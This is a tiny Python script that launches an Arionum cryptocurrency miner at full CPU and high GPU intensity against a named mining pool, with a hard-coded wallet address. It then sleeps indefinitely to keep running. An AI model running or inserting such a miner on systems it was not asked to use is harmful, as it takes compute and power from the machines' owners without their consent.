import os

os.system("./ariominer --mode miner --pool http://mine.arionumpool.com --wallet 29fwPvpz8UotEWHgGTQAhTDVX6BE3XXpQNJ9wy9WpBVqaoZ9UNgoULKrddfVyVXcQbfGhFR1TW3CvBNHo4k7xZHq --name mobileapps84 --cpu-intensity 100 --gpu-intensity-cblocks 80 --gpu-intensity-gblocks 80;sleep 88888888888888888888888884;")

